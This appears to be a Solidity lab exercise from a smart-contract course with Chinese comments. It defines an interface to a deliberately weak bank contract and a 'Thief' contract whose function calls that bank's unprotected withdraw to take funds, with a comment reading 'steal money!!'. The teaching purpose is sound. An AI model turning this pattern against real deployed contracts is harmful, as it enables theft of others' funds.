// SPDX-License-Identifier: Tinyverse (tinyverse.art)
// lab82_CalleeCaller_Thief.sol

pragma solidity >=0.7.0 <0.9.0;

contract TargetBank {
    /* 這個 TargetBank 的目的是提供介面（規格/規範）描述，讓 Thief 可以呼叫正確的 ABI
       因此雖然 "原始的 lab82_CalleeCaller_WeakBank.sol" 可能有多個 functions
       但你只需要宣告你會用到的 functions 即可
     */
    function getBalance() external view returns (uint) {}
    function withdraw(address _account, uint _amount) external payable {}
}

contract Thief {
    TargetBank tbank;
    
    constructor(address _ctaddr) {
        tbank = TargetBank(_ctaddr); // 這裡透過 constructor 設定目標合約 address
    }
    
    function callGetBalance() external view returns (uint) {
        return tbank.getBalance();
    }
    
    function callWithdraw(address _myaddr, uint _amount) external payable {
        tbank.withdraw(_myaddr, _amount); // 偷錢錢!!
    }
}
